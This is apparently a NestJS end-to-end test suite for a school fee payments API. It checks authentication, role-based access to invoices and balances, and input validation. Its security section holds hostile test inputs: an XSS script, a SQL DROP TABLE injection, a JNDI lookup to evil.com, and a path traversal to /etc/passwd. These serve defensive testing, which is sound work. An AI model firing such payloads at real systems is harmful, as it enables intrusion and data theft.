import { Test, TestingModule } from '@nestjs/testing';
import { INestApplication, ValidationPipe } from '@nestjs/common';
import request from 'supertest';
import { AppModule } from '../src/app.module';
import { PrismaService } from '../src/prisma/prisma.service';

// Set test environment variables
process.env.JWT_SECRET = 'test-jwt-secret-minimum-32-characters-long-12345';
process.env.JWT_REFRESH_SECRET = 'test-refresh-secret-32-characters-long-67890';
process.env.NODE_ENV = 'test';
process.env.REDIS_URL = 'redis://localhost:6379';

describe('PaymentsController (e2e)', () => {
    let app: INestApplication;
    let prisma: PrismaService;

    // Test data
    let adminToken: string;
    let teacherToken: string;
    let parentToken: string;
    let studentToken: string;
    let adminId: string;
    let parentId: string;
    let studentId: string;
    let invoiceId: string;
    let paymentId: string;

    beforeAll(async () => {
        const moduleFixture: TestingModule = await Test.createTestingModule({
            imports: [AppModule],
        }).compile();

        app = moduleFixture.createNestApplication();
        app.useGlobalPipes(new ValidationPipe({ whitelist: true, transform: true }));
        await app.init();

        prisma = moduleFixture.get<PrismaService>(PrismaService);
    });

    afterAll(async () => {
        await app.close();
    });

    beforeEach(async () => {
        // Clean up in correct order
        await prisma.payment.deleteMany({});
        await prisma.feeInvoice.deleteMany({});
        await prisma.parentStudent.deleteMany({});
        await prisma.userRole.deleteMany({});
        await prisma.refreshToken.deleteMany({});
        await prisma.user.deleteMany({
            where: { email: { contains: 'test@' } },
        });

        // Create test users
        const adminResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@admin.school.com',
                password: 'Password123!',
                firstName: 'Admin',
                lastName: 'User',
                role: 'admin',
            });
        adminToken = adminResponse.body.accessToken;
        adminId = adminResponse.body.user.id;

        const teacherResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@teacher.school.com',
                password: 'Password123!',
                firstName: 'Teacher',
                lastName: 'User',
                role: 'teacher',
            });
        teacherToken = teacherResponse.body.accessToken;

        const parentResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@parent.school.com',
                password: 'Password123!',
                firstName: 'Parent',
                lastName: 'User',
                role: 'parent',
            });
        parentToken = parentResponse.body.accessToken;
        parentId = parentResponse.body.user.id;

        const studentResponse = await request(app.getHttpServer())
            .post('/api/auth/register')
            .send({
                email: 'test@student.school.com',
                password: 'Password123!',
                firstName: 'Student',
                lastName: 'User',
                role: 'student',
            });
        studentToken = studentResponse.body.accessToken;
        studentId = studentResponse.body.user.id;

        // Create parent-student relationship
        await prisma.parentStudent.create({
            data: {
                parentId: parentId,
                studentId: studentId,
            },
        });
    });

    // ===============================================================================
    // AUTHENTICATION TESTS
    // ===============================================================================
    describe('Authentication', () => {
        it('should return 401 when no token provided', async () => {
            await request(app.getHttpServer())
                .get(`/api/payments/balance/${studentId}`)
                .expect(401);
        });

        it('should return 401 for invoice creation without token', async () => {
            await request(app.getHttpServer())
                .post('/api/payments/invoices')
                .send({
                    studentId: studentId,
                    title: 'Test Invoice',
                    totalAmount: 1000,
                })
                .expect(401);
        });

        it('should return 401 with invalid token', async () => {
            await request(app.getHttpServer())
                .get(`/api/payments/history/${studentId}`)
                .set('Authorization', 'Bearer invalid.token.here')
                .expect(401);
        });

        it('should return 401 with expired token', async () => {
            const expiredToken = adminToken.slice(0, -10) + '0000000000';
            await request(app.getHttpServer())
                .get('/api/payments/invoices')
                .set('Authorization', `Bearer ${expiredToken}`)
                .expect(401);
        });
    });

    // ===============================================================================
    // ROLE-BASED ACCESS TESTS
    // ===============================================================================
    describe('Role-Based Access Control', () => {
        describe('Invoice Management (Admin Only)', () => {
            it('should allow admin to create invoice', async () => {
                const response = await request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        studentId: studentId,
                        title: 'Tuition Fee',
                        description: 'Monthly tuition',
                        items: [
                            { name: 'Tuition', amount: 50000, category: 'education' },
                        ],
                        totalAmount: 50000,
                        dueDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
                    })
                    .expect(201);

                expect(response.body.id).toBeDefined();
                invoiceId = response.body.id;
            });

            it('should block teacher from creating invoices', async () => {
                await request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .send({
                        studentId: studentId,
                        title: 'Hacked Invoice',
                        totalAmount: 100,
                    })
                    .expect(403);
            });

            it('should block parent from creating invoices', async () => {
                await request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        studentId: studentId,
                        title: 'Fake Invoice',
                        totalAmount: 100,
                    })
                    .expect(403);
            });

            it('should block student from creating invoices', async () => {
                await request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${studentToken}`)
                    .send({
                        studentId: studentId,
                        title: 'Self Invoice',
                        totalAmount: 100,
                    })
                    .expect(403);
            });
        });

        describe('Balance Access', () => {
            beforeEach(async () => {
                // Create invoice for testing
                const invoice = await request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        studentId: studentId,
                        title: 'Test Invoice',
                        items: [{ name: 'Test', amount: 10000, category: 'test' }],
                        totalAmount: 10000,
                        dueDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
                    });
                invoiceId = invoice.body.id;
            });

            it('should allow admin to view any student balance', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/balance/${studentId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should allow teacher to view student balance', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/balance/${studentId}`)
                    .set('Authorization', `Bearer ${teacherToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should allow parent to view own child balance', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/balance/${studentId}`)
                    .set('Authorization', `Bearer ${parentToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should block parent from viewing unrelated student balance', async () => {
                // Create another student without parent relationship
                const otherStudent = await request(app.getHttpServer())
                    .post('/api/auth/register')
                    .send({
                        email: 'test@other.school.com',
                        password: 'Password123!',
                        firstName: 'Other',
                        lastName: 'Student',
                        role: 'student',
                    });

                await request(app.getHttpServer())
                    .get(`/api/payments/balance/${otherStudent.body.user.id}`)
                    .set('Authorization', `Bearer ${parentToken}`)
                    .expect(403);
            });

            it('should allow student to view own balance', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/balance/${studentId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body).toBeDefined();
            });

            it('should block student from viewing other student balance', async () => {
                const otherStudent = await request(app.getHttpServer())
                    .post('/api/auth/register')
                    .send({
                        email: 'test@other2.school.com',
                        password: 'Password123!',
                        firstName: 'Other',
                        lastName: 'Student',
                        role: 'student',
                    });

                await request(app.getHttpServer())
                    .get(`/api/payments/balance/${otherStudent.body.user.id}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(403);
            });
        });

        describe('Payment History Access', () => {
            it('should allow admin to view any payment history', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/history/${studentId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
            });

            it('should allow parent to view own child payment history', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/history/${studentId}`)
                    .set('Authorization', `Bearer ${parentToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
            });

            it('should allow student to view own payment history', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/history/${studentId}`)
                    .set('Authorization', `Bearer ${studentToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
            });
        });
    });

    // ===============================================================================
    // INVOICE CRUD TESTS
    // ===============================================================================
    describe('Invoice Operations', () => {
        describe('POST /api/payments/invoices', () => {
            it('should create invoice with all fields', async () => {
                const response = await request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        studentId: studentId,
                        title: 'Annual Tuition',
                        description: 'Full year tuition payment',
                        items: [
                            { name: 'Tuition', amount: 50000, category: 'education' },
                            { name: 'Books', amount: 5000, category: 'materials' },
                            { name: 'Activities', amount: 2000, category: 'activities' },
                        ],
                        totalAmount: 57000,
                        currency: 'USD',
                        dueDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
                    })
                    .expect(201);

                expect(response.body.id).toBeDefined();
                expect(response.body.title).toBe('Annual Tuition');
                expect(response.body.totalAmount).toBe(57000);
            });

            it('should return 400 for missing required fields', async () => {
                await request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        studentId: studentId,
                        // Missing title
                        totalAmount: 1000,
                    })
                    .expect(400);
            });

            it('should return 400 for invalid student ID', async () => {
                await request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        studentId: 'invalid-uuid',
                        title: 'Test Invoice',
                        totalAmount: 1000,
                    })
                    .expect(400);
            });

            it('should return 400 for negative amount', async () => {
                await request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        studentId: studentId,
                        title: 'Negative Invoice',
                        totalAmount: -100,
                    })
                    .expect(400);
            });

            it('should return 404 for non-existent student', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        studentId: nonExistentUuid,
                        title: 'Ghost Invoice',
                        items: [{ name: 'Test', amount: 100, category: 'test' }],
                        totalAmount: 100,
                    })
                    .expect(404);
            });

            it('should validate invoice items structure', async () => {
                await request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        studentId: studentId,
                        title: 'Invalid Items',
                        items: 'not-an-array',
                        totalAmount: 100,
                    })
                    .expect(400);
            });
        });
    });

    // ===============================================================================
    // BALANCE TESTS
    // ===============================================================================
    describe('Fee Balance', () => {
        beforeEach(async () => {
            // Create invoice
            const invoice = await request(app.getHttpServer())
                .post('/api/payments/invoices')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    studentId: studentId,
                    title: 'Test Invoice',
                    items: [{ name: 'Test', amount: 10000, category: 'test' }],
                    totalAmount: 10000,
                    dueDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
                });
            invoiceId = invoice.body.id;
        });

        describe('GET /api/payments/balance/:studentId', () => {
            it('should return balance with invoices', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/balance/${studentId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);

                expect(response.body.totalDue).toBeDefined();
                expect(response.body.totalPaid).toBeDefined();
                expect(response.body.remaining).toBeDefined();
                expect(response.body.invoices).toBeDefined();
                expect(Array.isArray(response.body.invoices)).toBe(true);
            });

            it('should calculate remaining balance correctly', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/balance/${studentId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);

                expect(response.body.remaining).toBe(
                    response.body.totalDue - response.body.totalPaid
                );
            });

            it('should return 404 for non-existent student', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .get(`/api/payments/balance/${nonExistentUuid}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(404);
            });

            it('should return 400 for invalid UUID', async () => {
                await request(app.getHttpServer())
                    .get('/api/payments/balance/invalid-uuid')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(400);
            });
        });
    });

    // ===============================================================================
    // PAYMENT HISTORY TESTS
    // ===============================================================================
    describe('Payment History', () => {
        describe('GET /api/payments/history/:studentId', () => {
            it('should return paginated payment history', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/history/${studentId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);

                expect(response.body.data).toBeDefined();
                expect(response.body.meta).toBeDefined();
            });

            it('should support custom pagination', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/history/${studentId}?page=1&limit=5`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);

                expect(response.body.meta.page).toBe(1);
                expect(response.body.meta.limit).toBe(5);
            });

            it('should return empty list for student with no payments', async () => {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/history/${studentId}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);

                expect(response.body.data).toEqual([]);
            });

            it('should return 400 for invalid pagination params', async () => {
                await request(app.getHttpServer())
                    .get(`/api/payments/history/${studentId}?page=invalid`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(400);
            });
        });
    });

    // ===============================================================================
    // PAYMENT INTENT TESTS
    // ===============================================================================
    describe('Payment Intent', () => {
        beforeEach(async () => {
            // Create invoice
            const invoice = await request(app.getHttpServer())
                .post('/api/payments/invoices')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    studentId: studentId,
                    title: 'Test Invoice',
                    items: [{ name: 'Test', amount: 10000, category: 'test' }],
                    totalAmount: 10000,
                    dueDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
                });
            invoiceId = invoice.body.id;
        });

        describe('POST /api/payments/intent', () => {
            it('should create payment intent', async () => {
                const response = await request(app.getHttpServer())
                    .post('/api/payments/intent')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        amount: 5000,
                        currency: 'USD',
                        studentId: studentId,
                        invoiceId: invoiceId,
                    });

                // May succeed or fail based on Stripe configuration
                expect([201, 400, 500]).toContain(response.status);
            });

            it('should return 400 for invalid amount', async () => {
                await request(app.getHttpServer())
                    .post('/api/payments/intent')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        amount: -100,
                        studentId: studentId,
                    })
                    .expect(400);
            });

            it('should return 400 for missing studentId', async () => {
                await request(app.getHttpServer())
                    .post('/api/payments/intent')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        amount: 5000,
                    })
                    .expect(400);
            });

            it('should return 403 for unauthorized student access', async () => {
                const otherStudent = await request(app.getHttpServer())
                    .post('/api/auth/register')
                    .send({
                        email: 'test@other.school.com',
                        password: 'Password123!',
                        firstName: 'Other',
                        lastName: 'Student',
                        role: 'student',
                    });

                await request(app.getHttpServer())
                    .post('/api/payments/intent')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        amount: 5000,
                        studentId: otherStudent.body.user.id,
                    })
                    .expect(403);
            });

            it('should return 400 for zero amount', async () => {
                await request(app.getHttpServer())
                    .post('/api/payments/intent')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        amount: 0,
                        studentId: studentId,
                    })
                    .expect(400);
            });
        });
    });

    // ===============================================================================
    // PAYMENT CONFIRMATION TESTS
    // ===============================================================================
    describe('Payment Confirmation', () => {
        describe('POST /api/payments/confirm', () => {
            it('should return error for invalid payment intent', async () => {
                const response = await request(app.getHttpServer())
                    .post('/api/payments/confirm')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        paymentIntentId: 'pi_invalid_123',
                        paymentMethod: 'card',
                    });

                // Should fail validation or processing
                expect([400, 404, 500]).toContain(response.status);
            });

            it('should return 400 for missing payment intent ID', async () => {
                await request(app.getHttpServer())
                    .post('/api/payments/confirm')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        paymentMethod: 'card',
                    })
                    .expect(400);
            });

            it('should return 400 for invalid payment method', async () => {
                await request(app.getHttpServer())
                    .post('/api/payments/confirm')
                    .set('Authorization', `Bearer ${parentToken}`)
                    .send({
                        paymentIntentId: 'pi_test_123',
                        paymentMethod: 'invalid_method',
                    })
                    .expect(400);
            });

            it('should accept valid payment methods', async () => {
                const validMethods = ['card', 'bank_transfer', 'cash'];

                for (const method of validMethods) {
                    const response = await request(app.getHttpServer())
                        .post('/api/payments/confirm')
                        .set('Authorization', `Bearer ${parentToken}`)
                        .send({
                            paymentIntentId: 'pi_test_123',
                            paymentMethod: method,
                        });

                    // May succeed or fail based on Stripe/mock configuration
                    expect([200, 400, 404, 500]).toContain(response.status);
                }
            });
        });
    });

    // ===============================================================================
    // RECEIPT TESTS
    // ===============================================================================
    describe('Payment Receipt', () => {
        describe('GET /api/payments/receipt/:paymentId', () => {
            it('should return 404 for non-existent payment', async () => {
                const nonExistentUuid = '12345678-1234-1234-1234-123456789abc';
                await request(app.getHttpServer())
                    .get(`/api/payments/receipt/${nonExistentUuid}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(404);
            });

            it('should return 400 for invalid payment ID', async () => {
                await request(app.getHttpServer())
                    .get('/api/payments/receipt/invalid-uuid')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(400);
            });

            it('should enforce receipt access permissions', async () => {
                // Create another student and parent
                const otherParent = await request(app.getHttpServer())
                    .post('/api/auth/register')
                    .send({
                        email: 'test@otherparent.school.com',
                        password: 'Password123!',
                        firstName: 'Other',
                        lastName: 'Parent',
                        role: 'parent',
                    });

                // Create invoice and payment for our student
                const invoice = await request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        studentId: studentId,
                        title: 'Receipt Test',
                        items: [{ name: 'Test', amount: 100, category: 'test' }],
                        totalAmount: 100,
                    });

                // Other parent shouldn't access this student's receipt
                await request(app.getHttpServer())
                    .get(`/api/payments/receipt/${invoice.body.id}`)
                    .set('Authorization', `Bearer ${otherParent.body.accessToken}`)
                    .expect(403);
            });
        });
    });

    // ===============================================================================
    // SECURITY TESTS
    // ===============================================================================
    describe('Security Tests', () => {
        it('should sanitize XSS in invoice title', async () => {
            const xssPayload = '<script>alert("xss")</script>';

            await request(app.getHttpServer())
                .post('/api/payments/invoices')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    studentId: studentId,
                    title: xssPayload,
                    items: [{ name: 'Test', amount: 100, category: 'test' }],
                    totalAmount: 100,
                })
                .expect(201);
        });

        it('should prevent SQL injection in invoice title', async () => {
            await request(app.getHttpServer())
                .post('/api/payments/invoices')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    studentId: studentId,
                    title: '\'; DROP TABLE fee_invoices; --',
                    items: [{ name: 'Test', amount: 100, category: 'test' }],
                    totalAmount: 100,
                })
                .expect(201);

            // Verify invoices still exist
            const response = await request(app.getHttpServer())
                .get(`/api/payments/balance/${studentId}`)
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            expect(response.body.invoices).toBeDefined();
        });

        it('should validate all UUID parameters', async () => {
            const injectionAttempts = [
                "' OR '1'='1",
                "${jndi:ldap://evil.com}",
                "<img src=x onerror=alert(1)>",
                "../../../etc/passwd",
            ];

            for (const attempt of injectionAttempts) {
                await request(app.getHttpServer())
                    .get(`/api/payments/balance/${encodeURIComponent(attempt)}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(400);
            }
        });

        it('should reject oversized invoice items', async () => {
            const hugeItems = Array(1000).fill({
                name: 'a'.repeat(100),
                amount: 1,
                category: 'test',
            });

            await request(app.getHttpServer())
                .post('/api/payments/invoices')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    studentId: studentId,
                    title: 'Huge Invoice',
                    items: hugeItems,
                    totalAmount: 1000,
                })
                .expect(400);
        });

        it('should prevent payment amount tampering', async () => {
            await request(app.getHttpServer())
                .post('/api/payments/intent')
                .set('Authorization', `Bearer ${parentToken}`)
                .send({
                    amount: 999999999, // Suspiciously large
                    studentId: studentId,
                })
                .expect(400);
        });

        it('should validate currency format', async () => {
            // Create invoice with valid data first
            const response = await request(app.getHttpServer())
                .post('/api/payments/invoices')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    studentId: studentId,
                    title: 'Currency Test',
                    items: [{ name: 'Test', amount: 100, category: 'test' }],
                    totalAmount: 100,
                    currency: 'INVALID_CURRENCY_CODE',
                });

            // Should either accept (store as-is) or reject
            expect([201, 400]).toContain(response.status);
        });
    });

    // ===============================================================================
    // EDGE CASES
    // ===============================================================================
    describe('Edge Cases', () => {
        it('should handle concurrent invoice creation', async () => {
            const promises = Array(5).fill(0).map((_, i) =>
                request(app.getHttpServer())
                    .post('/api/payments/invoices')
                    .set('Authorization', `Bearer ${adminToken}`)
                    .send({
                        studentId: studentId,
                        title: `Concurrent Invoice ${i}`,
                        items: [{ name: 'Test', amount: 100, category: 'test' }],
                        totalAmount: 100,
                    })
            );

            const responses = await Promise.all(promises);

            responses.forEach(response => {
                expect([201, 429]).toContain(response.status);
            });
        });

        it('should handle zero balance correctly', async () => {
            const response = await request(app.getHttpServer())
                .get(`/api/payments/balance/${studentId}`)
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            expect(response.body.totalDue).toBe(0);
            expect(response.body.totalPaid).toBe(0);
            expect(response.body.remaining).toBe(0);
        });

        it('should handle past due dates', async () => {
            const pastDate = new Date(Date.now() - 30 * 24 * 60 * 60 * 1000);

            const response = await request(app.getHttpServer())
                .post('/api/payments/invoices')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    studentId: studentId,
                    title: 'Past Due Invoice',
                    items: [{ name: 'Test', amount: 100, category: 'test' }],
                    totalAmount: 100,
                    dueDate: pastDate,
                })
                .expect(201);

            expect(response.body.dueDate).toBeDefined();
        });

        it('should handle very large amounts', async () => {
            const response = await request(app.getHttpServer())
                .post('/api/payments/invoices')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    studentId: studentId,
                    title: 'Large Invoice',
                    items: [{ name: 'Test', amount: 1000000, category: 'test' }],
                    totalAmount: 1000000,
                });

            // May accept or reject based on validation
            expect([201, 400]).toContain(response.status);
        });

        it('should handle fractional amounts', async () => {
            const response = await request(app.getHttpServer())
                .post('/api/payments/invoices')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    studentId: studentId,
                    title: 'Fractional Invoice',
                    items: [{ name: 'Test', amount: 99.99, category: 'test' }],
                    totalAmount: 99.99,
                });

            // May accept or reject based on validation
            expect([201, 400]).toContain(response.status);
        });

        it('should handle empty invoice items', async () => {
            await request(app.getHttpServer())
                .post('/api/payments/invoices')
                .set('Authorization', `Bearer ${adminToken}`)
                .send({
                    studentId: studentId,
                    title: 'Empty Items',
                    items: [],
                    totalAmount: 0,
                })
                .expect(201);
        });

        it('should handle pagination limits', async () => {
            // Test various page sizes
            const limits = [1, 5, 10, 50, 100, 1000];

            for (const limit of limits) {
                const response = await request(app.getHttpServer())
                    .get(`/api/payments/history/${studentId}?page=1&limit=${limit}`)
                    .set('Authorization', `Bearer ${adminToken}`)
                    .expect(200);

                expect(response.body.meta.limit).toBeLessThanOrEqual(100);
            }
        });

        it('should handle negative page numbers', async () => {
            await request(app.getHttpServer())
                .get(`/api/payments/history/${studentId}?page=-1`)
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(400);
        });

        it('should handle student with deleted parent relationship', async () => {
            // Remove parent relationship
            await prisma.parentStudent.deleteMany({
                where: { parentId: parentId, studentId: studentId },
            });

            // Parent should no longer access
            await request(app.getHttpServer())
                .get(`/api/payments/balance/${studentId}`)
                .set('Authorization', `Bearer ${parentToken}`)
                .expect(403);
        });
    });
});
